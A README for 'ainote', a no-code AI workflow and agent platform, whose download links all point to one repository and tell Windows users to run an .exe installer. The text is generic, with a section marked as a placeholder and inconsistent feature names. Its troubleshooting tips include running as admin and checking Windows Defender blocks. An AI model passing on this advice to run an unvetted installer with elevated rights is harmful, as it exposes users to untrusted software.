# 🚀 ainote - Orchestrate AI workflows without coding

[![Download](https://img.shields.io/badge/Download-ainote-20B2AA?style=for-the-badge)](https://github.com/nutpineshaking812/ainote)

## 🎯 What is ainote?

ainote is a powerful open-source platform that lets you build AI agents and automate workflows using a simple drag-and-drop interface — no programming skills required. Think of it as a visual toolkit to connect large language models (LLMs), knowledge bases, forms, and digital workers into smart automated processes.

## 💡 Why use ainote?

| Problem | Solution |
|---------|----------|
| Too much repetitive manual work | Create automated workflows in minutes |
| Need AI but can't code | Build with drag-and-drop blocks |
| Data scattered across tools | Connect everything in one place |
| Each AI tool works alone | Combine multiple AI models together |

## 👥 Who is this for?

*   Non-technical professionals who want to automate tasks
*   Teams needing quick AI prototypes without developers
*   Anyone exploring AI agents without a budget for paid cloud services

## ⚙️ Core Features

**1. Visual Flow Orchestration**
Design complex processes by linking pre-built cards on a canvas. Each card is a step: fetch data, call an LLM, run a form, and more.

**2. Drag-and-Drop Forms**
Create custom forms for data input, validation, or user entry in your workflow. No HTML or JavaScript needed.

**3. Knowledge Base RAG**
Upload documents (PDFs, websites, etc.) to build a knowledge base. When your agent answers, it retrieves relevant info — like an always-ready assistant.

**4. Multi-Model LLM Support**
Switch between different AI models (GPT, Claude, local models) within one workflow. Let each model do what it does best.

**5. Digital Workers (Auto Tasks)**
Set up automated agents that respond to triggers, run schedules, or handle repetitive tasks.

**6. Tauri Desktop App**
A built-in desktop interface that feels like any normal application. Works on Windows.

**7. DingTalk Bot Integration**
Connect to DingTalk (team chat) so your AI agent can send and receive messages.

**8. Self-Hosted & Private**
Run everything on your own computer or server. Your data stays with you.

## 🚀 Getting Started

Follow these steps to get ainote running on Windows.

### Step 1: Download the App

Visit this link to download the application.

[**Download ainote for Windows**](https://github.com/nutpineshaking812/ainote)

### Step 2: Run the Installer

1.  After downloading, locate the installer file. It is typically in your `Downloads` folder (e.g., `ainote-setup.exe`).
2.  Double-click the file to start installation.
3.  Follow the on-screen instructions. Accept default settings unless you have specific preferences.

### Step 3: Launch the Application

1.  If not started automatically, find `ainote` in your Start Menu or desktop.
2.  Double-click to run the desktop app.
3.  A Tauri window will open with the main dashboard.

### Step 4: Open in Browser (Optional)

Alternatively, if your workflow output creates a web server, open your browser and go to `http://localhost:3000` to see your first project.

### Step 5: Start Building

1.  Click on "New Workflow".
2.  Drag cards from the left panel onto the canvas.
3.  Connect them with arrows.
4.  Configure each card with simple options.
5.  Click "Run" to test.

## 🎨 User Interface Tour

When you first launch ainote, you'll see:

*   **Left Panel:** Components (Workflows, Forms, Knowledge Bases, Digital Workers, etc.)
*   **Center Canvas:** Where you drag components to build workflows.
*   **Right Panel:** Settings for the selected component.
*   **Bottom Status Bar:** Shows current workflow status and logs.

## 🔧 Configuration Options

**Workflow Triggers:**
*   **Scheduled:** Run at set times (e.g., every Monday 9 AM).
*   **Incident:** Start when a form is submitted.
*   **Manual:** Use on-demand.

**Integration:**
- **LLM:** Choose model, temperature, max tokens.
- **Knowledge Base:** Upload files, connect to external databases, or use vector DB (pgvector) for RAG.
- **Digital Employer:** Set up triggers, inputs, outputs, and actions.

**DingTalk Bot:**
- Requires app ID and secret from DingTalk developer console.
- Use these to set up bot notification.

## ⚙️ System Requirements (Placeholder)

*   **Operating System:** Windows 10 or later (64-bit)
*   **Processor:** 2 GHz dual-core or better
*   **Memory:** 4 GB RAM minimum (8 GB+ recommended)
*   **Storage:** 512 MB for installation; additional for workflow persistence
*   **Internet:** For initial download, LLM API calls, and updates
*   **Optional:** GPU for local LLM inference (not required)

## 🌐 Advanced: Self-Hosted Service

If you want to run ainote as a service accessible over your network:

1.  Open the `ainote` app with admin privileges.
2.  Go to **Settings** > **Server**.
3.  Toggle "Start Web Server".
4.  Choose port (default: 3000).
5.  Save and restart the app. Now others on the same network can access via browser at `http://your-windows-ip:3000`.

## 🛠️ Troubleshooting

| Problem | Solution |
|----------|----------|
| App doesn't start | Make sure no other version is running. Check Windows Defender blocks. Run as admin. |
| Installation fails | Download newer version or extract `.zip` to a folder manually |
| LLM API errors | Check your API key in Settings > LLM Provider. Ensure the model is valid on provider side |
| Knowledge Base not indexing | Ensure documents are under 50MB per file. Supported formats: .txt, .pdf, .docx |
| Workflow runs slowly | Reduce concurrency in advanced settings. Use local models if possible. |

## 💬 Community & Support

*   **GitHub Issues:** For bugs or feature requests at the download link.
*   **DingTalk Group:** If configured, connect your bot to a group for support.
*   **Documentation:** In-app help sections explain all flows.

## 🗺️ Roadmap

- Actual Secretary to schedule human-level tasks
- More starter templates
- Better mobile view in browser
- Integration with Google Sheets, Slack, etc.

## 🎓 Examples

Here are simple use cases you can build in min:

**Customer Support Bot**
1.  Drag a "Form" card → collect user query.
2.  Drag "Knowledge Base" card → link your PDF manual.
3.  Drag "LLM Chat" card → set model for response.
4.  Drag "Email/Notification" card → send answer to user.
5.  Run.

**Automated Blog Generator**
1.  On schedule (Daily 8 AM), drag "Webhook" to get trending topics.
2.  Drag "LLM Output" → prompt: "Write a 500-word blog in style".
3.  Connect to email output → send to your inbox.
4.  Done.

## 💰 Pricing

**Complete open-source. Free.** No hidden features. Host it anywhere without subscription. If you want cloud hosting support, contact the team.

## 📄 License

ainote is distributed under open-source license. See `LICENSE` in repo for details.

---

**Keywords:** ai-agent, coze-alternative, deepagent, dify-alternative, knowledge, llm, low-code, n8n-alternative, no-code, pgvector, rag, self-hosted, temporal, workflow